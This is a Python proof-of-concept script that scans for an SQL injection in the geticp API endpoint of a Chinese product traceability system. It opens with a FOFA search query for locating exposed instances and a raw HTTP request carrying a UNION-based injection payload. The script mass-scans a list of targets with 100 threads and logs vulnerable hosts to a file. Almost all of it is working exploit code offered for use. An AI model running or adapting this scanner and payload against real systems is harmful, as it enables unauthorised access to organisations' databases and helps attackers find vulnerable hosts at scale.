# fofa：(body="chunk-libs.45edf705.css" && title="产品追溯系统") || title="4.1.0追溯系统"
"""GET /api/org/enterpriseaccountnoauth/geticp?enterprise_code=1%27)%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT(0x71787a6271,0x4e754b52684541696a424d6d7346475364634d6e4d426a4261466f51717577564359486f7a594571,0x71767a7171),NULL,NULL,NULL--%20- HTTP/1.1
    Host: 
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close"""

# 导包
import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
             _   _                       _ 
            | | (_)                     | |
   __ _  ___| |_ _  ___ _ __   ___  __ _| |
  / _` |/ _ \ __| |/ __| '_ \ / __|/ _` | |
 | (_| |  __/ |_| | (__| |_) |\__ \ (_| | |
  \__, |\___|\__|_|\___| .__/ |___/\__, |_|
   __/ |               | |______      | |  
  |___/                |_|______|     |_|  
"""
    print(test)



def main():
    banner()

    # 初始化
    parse = argparse.ArgumentParser(description="弥特科技全流程追溯系统geticp存在SQL注入")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help="Please input your url")
    parse.add_argument('-f','--flie',dest='file',type=str,help="Please input your file")

    # 实例化
    args = parse.parse_args()

    # 判断用户输入的参数
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")


def poc(target):
    link = '/api/org/enterpriseaccountnoauth/geticp?enterprise_code=1'
    payload = '%27)%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT(0x71787a6271,0x4e754b52684541696a424d6d7346475364634d6e4d426a4261466f51717577564359486f7a594571,0x71767a7171),NULL,NULL,NULL--%20-'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection": "close"
    }
    proxies = {
        "http" : "http://127.0.0.1:7890",
        "https" : "http://127.0.0.1:7890"
    }
    
    try:
        res1 = requests.get(url=target,headers=headers,timeout=15,verify=False,proxies=proxies)
        if res1.status_code == 200:
            res2 = requests.get(url=target+link+payload,headers=headers,timeout=15,verify=False,proxies=proxies)
            res2_concent = json.loads(res2.text)
            if res2_concent["message"] == "成功":
                print(f"[+]该{target}存在sql注入")
                with open("result.txt",'a',encoding='utf-8') as f:      # 将结果写入到result.txt文件中
                    f.write(f"[+]该{target}存在sql注入"+'\n')
            else:
                print(f"[-]该{target}不存在sql注入")
    except:
        print(f"该{target}存在问题，请手工进行测试")


if __name__ == "__main__":
    main()